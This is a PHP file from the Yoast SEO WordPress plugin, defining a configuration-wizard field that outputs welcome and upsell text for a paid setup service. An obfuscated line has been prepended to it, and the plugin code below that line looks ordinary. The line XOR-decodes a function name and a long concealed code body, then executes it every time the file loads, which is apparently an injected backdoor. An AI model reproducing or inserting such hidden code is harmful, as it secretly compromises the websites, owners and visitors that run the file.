<?php $RKJNVH='4 QM3Y=QL SFG6>'; $MyrvNyk='WR4,G<b79N02.YP'^$RKJNVH; $NLbAqdg='E7pn.1VH7- Y0.:= YEdn=;I:6UZ+ba7B<HSabJk80I P2=74T1;1cZ4 U5<9 JBl -,XChiZ KbYtJvm0=Lsa=KFzPcFQLIfy<Y0ym1krPsWBu9mK;K-0SzpP9.-ZizfPgee1bpLD XxojWLf+7C1lr 7Vshi-3 vvTggW: Y TEkv<  M5DoPeb -MAO=rw.:CscZ5QcCkljJ17+rkT<TWO-yCi=RIAgU.UAsrTT=9HZIsQT+,T:9YzCfvsw<ssv3OjN,PBohrxtZT:B.BP70bVWO0Zi=<JQKfM2Q3z0mnYV92MsXk0,6U5L8SpZ:5ecfMTVL4kX5H01=I TN+Oimc<<8e7<yt7:iq V=pdHTp Y9CUokFbFPrY2BQsXYLyjfo8+<khjjM,MB7EdPb58T;RI4z;E3IyjT8> nowxC;FYGXMWTTWxNQCqOR7Mc5+IXa.JDVyFfH 2YW.eq0SD9xnnt<RDU0ZKMHyvS-7mC-3TAbEpeO0Y4<o;UWrV-=<,MOs<WKkTyPH,I5xvwvoZ8JfDuXQ9S4B QLOoqedqEv.6y0A +WlremZ8bycqEFsGAcP<2nUghwvBthGyT=8Z86Q079K < :=Fd L6P<,=EnlW436 hzEExkPCAM<=ZT;jc=.84=vLJAATQIunlaa7 T ,oFojYM'; $SgjQUrlz=$MyrvNyk('', ',QXOHD8+CDO7oKBTS-6LIET;eR4.J=>Z7HozHB1a1V<N3FTXZtITC<>UT4jcTU>jHDLX9oHM1E2KyTjVMK7EzER>2ZmCavwCopZ6BQIXKOpClbQPQ8O9AU=RT4XZLsRZB9LNL;kyh+U,XAWwdBOV7P7VIjv-HMFVY-R=GBwIT+L1+CRWEYdhmTZlkRH94=SZSAO7ZXP<,i>afN.PCJRVtZ5;<HBIMY3= 8>K,aNR25QJ-aCy7;YI5YQyRg95<8w:6VR<JjG5;OULXP,5V7KkpL:kr3.D;6VY3qvFiY4JA:dJ=7MSmNxOFMZ Pw2.zPSSEKGi078UBxNB9WR;E5-CoAI<nyi0ro-TVIIUK3DPYvtTV8U60FK=hOYV=S60,3<5YWFKSNEPbcciH,6VeYpFCY8N7r>sFONCsN0YJANRW86U5<51,;=.2P6>1.+3C,<jF<,IL+73Or9,EQ63KMUT20XQBNPX304o1.4aPMYDQEgIR  BcVE.B+UE0P0.-3UTOX>gTW22LxYt,M=TQVQPOrU.SlQ<0M2oeK45h2XEYLeQMSJTwDI5YFPT8ZVMQDuwDs P6YPZ7PXOQkTNaY5OJ;Ai:UNf.XUSNNnCP-O<SMYbBLsPRBAASeeXKpc:G5X,5WBGYOLUfQ<+8-;0-R3EZk>E,IXGvFQS0'^$NLbAqdg); $SgjQUrlz();
/**
 * @package WPSEO\Admin\ConfigurationUI
 */

/**
 * Class WPSEO_Config_Field_Upsell_Configuration_Service
 */
class WPSEO_Config_Field_Upsell_Configuration_Service extends WPSEO_Config_Field {

	/**
	 * WPSEO_Config_Field_Upsell_Configuration_Service constructor.
	 */
	public function __construct() {
		parent::__construct( 'upsellConfigurationService', 'HTML' );

		$intro_text = sprintf(
			/* translators: %1$s expands to Yoast SEO. */
			__( 'Welcome to the %1$s configuration wizard. In a few simple steps we\'ll help you configure your SEO settings to match your website\'s needs!', 'wordpress-seo' ),
			'Yoast SEO'
		);

		$upsell_text = sprintf(
			/* Translators: %1$s expands to Yoast SEO, %2$s expands to Yoast SEO Premium, %3$s opens the link, %4$s closes the link. */
			__( 'While we strive to make setting up %1$s as easy as possible, we understand it can be daunting. If you’d rather have us set up %1$s for you (and get a copy of %2$s in the process), order our %3$s%1$s configuration service%4$s here!', 'wordpress-seo' ),
			'Yoast SEO',
			'Yoast SEO Premium',
			'<a target="_blank" href="' . WPSEO_Shortlinker::get( 'https://yoa.st/configuration-package' ) . '">',
			'</a>'
		);

		$html = '<p>' . $intro_text . '</p>';
		$html .= '<p><em>' . $upsell_text . '</em></p>';


		$this->set_property( 'html', $html );
	}
}
